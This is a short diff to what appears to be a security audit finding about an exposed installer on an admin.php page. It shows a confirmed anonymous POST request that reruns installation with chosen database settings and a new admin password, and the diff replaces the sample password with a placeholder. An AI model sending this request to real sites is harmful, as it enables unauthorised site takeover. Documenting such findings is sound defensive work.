@@ -62,7 +62,7 @@ This is the same exposure class as an unprotected WordPress `wp-admin/install.ph
 **Confirmed (live):**
 ```
 POST /admin.php  process=install&db_host=127.0.0.1&db_user=root&db_pass=auditpass
-                 &db_name=phoenix&db_prefix=phoenix_&admin_password=PwnedByAttacker1
+                 &db_name=phoenix&db_prefix=phoenix_&admin_password=### attacker's pass ###
 → HTTP/1.1 302 Found
   Location: admin.php?installed=1
 # config/phoenix.custom.php written by the anonymous request:
